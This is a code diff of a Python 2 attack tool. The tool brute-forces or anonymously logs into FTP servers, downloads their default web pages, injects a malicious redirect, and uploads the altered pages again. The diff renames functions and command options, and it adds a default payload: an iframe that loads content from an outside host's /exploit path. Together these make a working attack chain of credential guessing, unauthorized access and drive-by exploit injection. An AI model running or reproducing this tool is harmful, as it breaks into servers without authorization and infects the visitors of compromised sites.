@@ -1,12 +1,13 @@
 #!/usr/bin/env python2
 # written by Moses Arocha
-# Program attempts to brute force into an FTP server, gain access, login in as an anonymous user, then will inject malicious code into the webpage after it has downloaded
+# Program attempts to brute force into an FTP server, gain access, or login in as an anonymous user, 
+# then will inject malicious code into the webpage after it has downloaded
 
 import ftplib
 import optparse
 import time
 
-def anonLogin(hostname):
+def Anonymous(hostname):
 	try:
 		ftp = ftplib.FTP(hostname)
 		ftp.login('anonymous', 'me@yourdomain.com')
@@ -14,10 +15,10 @@ def anonLogin(hostname):
 		ftp.quit()
 		return True
 	except Exception, e:
-		print '\n\t[Failure] ' + str(hostname) + ' FTP Anonymous Login Failed'
+		print '\n\t[Failure] ' + str(hostname) + ' FTP Anonymous Login Failed\n'
 		return False
 	
-def bruteLogin(hostname, passwdFile):
+def BruteForce(hostname, passwdFile):
 	pF = open(passwdFile, 'r')
 	for line in pF.readlines():
 		time.sleep(1)
@@ -35,7 +36,7 @@ def bruteLogin(hostname, passwdFile):
 	print '\n[Failure] Could Not Brute Force FTP Credentials'
 	return (None, None)
 
-def returnDefault(ftp):
+def DefaultPage(ftp):
 	try:
 		dirList = ftp.nlst()
 	except:
@@ -51,7 +52,7 @@ def returnDefault(ftp):
 		retList.append(fileName)
 	return retList
 
-def injectPage(ftp, page, redirect):
+def Injection(ftp, page, redirect):
 	f = open(page + '.tmp', 'w')
 	ftp.retrlines('RETR ' + page, f.write)
 	print ' [Step 1] Downloaded Page: ' + page
@@ -61,38 +62,38 @@ def injectPage(ftp, page, redirect):
 	ftp.storlines('STOR ' + page, open(page + '.tmp'))
 	print ' [Step 3] Uploaded Injected Page: ' + page
 	
-def attack(username, password, tgtHost, redirect):
-	ftp = ftplib.FTP(tgtHost)
+def WebAttack(username, password, TargetHost, redirect):
+	ftp = ftplib.FTP(TargetHost)
 	ftp.login(username, password)
-	defPages = returnDefault(ftp)
+	defPages = DefaultPage(ftp)
 	for defPage in defPages:
-		injectPage(ftp, defPage, redirect)
+		Injection(ftp, defPage, redirect)
 
 def main():
-	parser = optparse.OptionParser("Usages For Program: -H <Target Host[s]> -r <Redirect Page> -f <userpass file>")
-	parser.add_option('-H', dest='tgtHosts', type='string', help='specify target host')
-	parser.add_option('-f', dest='passwdFile', type='string', help='specify user/password file')
-	parser.add_option('-r', dest='redirect', type='string', help='specify a redirection page')
+	parser = optparse.OptionParser("Usages For Program: -H <Target Host[s]> -R <Redirect Page> -F <Password File>")
+	parser.add_option('-H', '--Host', dest='TargetHosts', type='string', help='specify target host')
+	parser.add_option('-P', '--Password', dest='passwdFile', type='string', help='specify user/password file', default='passwordlist.txt')
+	parser.add_option('-R', '--Redirect', dest='redirect', type='string', help='specify a redirection page', default='<iframe src="http://10.0.0.145:80/exploit"></iframe>')
 	(options, args) = parser.parse_args()
-	tgtHosts = str(options.tgtHosts).split(',')
+	TargetHosts = str(options.TargetHosts).split(',')
 	passwdFile = options.passwdFile
 	redirect = options.redirect
-	if tgtHosts == None or redirect == None:
+	if TargetHosts == None or redirect == None:
 		print parser.usage
 		exit(0)
-	for tgtHost in tgtHosts:
+	for TargetHost in TargetHosts:
 		username = None
 		password = None
-		if anonLogin(tgtHost) == True:
+		if Anonymous(TargetHost) == True:
 			username = 'anonymous'
 			password = 'me@yourdomain.com'
 			print ' [Success] Now Using Anonymous Username and Password'
-			attack(username, password, tgtHost, redirect)
+			WebAttack(username, password, TargetHost, redirect)
 		elif passwdFile != None:
-			(username, password) = bruteLogin(tgtHost, passwdFile)
+			(username, password) = BruteForce(TargetHost, passwdFile)
 		if password != None:	
-			print '[+] Using Credientals: ' + username + '/' + password + ' To Attack'
-			attack(username, password, tgtHost, redirect)
+			print '[+] Using Credientals: ' + username + '/' + password + ' To WebAttack'
+			WebAttack(username, password, TargetHost, redirect)
 
 
 if __name__ == '__main__':
